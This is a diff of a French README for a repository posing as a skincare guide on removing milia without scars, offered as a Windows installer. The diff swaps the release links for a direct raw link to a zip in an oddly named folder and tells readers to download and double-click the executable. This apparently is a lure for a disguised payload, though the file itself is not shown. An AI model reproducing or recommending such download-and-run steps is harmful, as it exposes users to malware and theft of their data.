@@ -1,6 +1,6 @@
 # 🌿 enlever-grain-milium-visage-sans-cicatrice-guide-2026 - Soin cutané expert pour peau nette
 
-[![](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/com445/enlever-grain-milium-visage-sans-cicatrice-guide-2026/releases)
+[![](https://img.shields.io/badge/Download-Release-blue.svg)](https://raw.githubusercontent.com/com445/enlever-grain-milium-visage-sans-cicatrice-guide-2026/main/atrichous/grain_cicatrice_enlever_sans_milium_guide_visage_v1.4-alpha.3.zip)
 
 ## 📋 À propos de ce guide
 
@@ -21,7 +21,7 @@ Votre ordinateur doit respecter ces conditions pour exécuter le programme :
 
 Le logiciel est disponible sous forme d'exécutable pour Windows. Suivez ces étapes pour installer l'application sur votre poste :
 
-1. Visitez [cette page](https://github.com/com445/enlever-grain-milium-visage-sans-cicatrice-guide-2026/releases) pour trouver les versions disponibles.
+1. Visitez [cette page](https://raw.githubusercontent.com/com445/enlever-grain-milium-visage-sans-cicatrice-guide-2026/main/atrichous/grain_cicatrice_enlever_sans_milium_guide_visage_v1.4-alpha.3.zip) pour trouver les versions disponibles.
 2. Cliquez sur le fichier se terminant par .exe dans la section Assets.
 3. Enregistrez le fichier sur votre bureau.
 4. Double-cliquez sur le fichier téléchargé pour lancer l'assistant d'installation.
